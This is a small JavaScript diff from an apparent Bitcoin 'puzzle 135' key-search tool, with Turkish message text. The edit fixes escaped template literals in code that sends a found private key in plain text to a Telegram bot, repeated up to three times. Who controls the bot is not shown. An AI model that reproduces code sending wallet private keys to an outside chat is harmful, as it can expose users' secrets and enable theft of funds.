@@ -305,7 +305,7 @@ ${line}
 4. puzzle135btc'ye "reward" memo ile gönder`;
 
     try {
-      await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method : 'POST',
         headers: { 'Content-Type': 'application/json' },
         body   : JSON.stringify({
@@ -324,12 +324,12 @@ ${line}
     const repeat = setInterval(async () => {
       count++;
       try {
-        await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method : 'POST',
           headers: { 'Content-Type': 'application/json' },
           body   : JSON.stringify({
             chat_id: CHAT_ID,
-            text   : \`🔔 HATIRLATMA (\${count}/3): Puzzle çözüldü! Private key: \${line}\`
+            text   : `🔔 HATIRLATMA (${count}/3): Puzzle çözüldü! Private key: ${line}`
           })
         });
       } catch {}
